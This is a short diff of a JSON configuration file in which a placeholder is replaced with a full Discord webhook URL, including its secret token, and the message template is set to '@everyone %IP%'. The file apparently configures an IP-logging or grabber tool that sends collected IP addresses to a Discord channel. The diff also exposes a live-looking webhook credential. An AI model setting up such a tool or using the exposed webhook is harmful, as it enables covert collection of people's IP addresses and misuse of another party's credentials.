@@ -1,5 +1,5 @@
 {
-  "webhook": "YOUR_WEBHOOK_URL_HERE",
+  "webhook": "https://discordapp.com/api/webhooks/1534643292552036608/2oCQnYcM1oTHIVsDkZFRhx00XjpCY3jPINdtk2A-nX5YoPPRmLxTtkPN6dXpm2BxzyeR",
   "webhook_name": "webhook",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
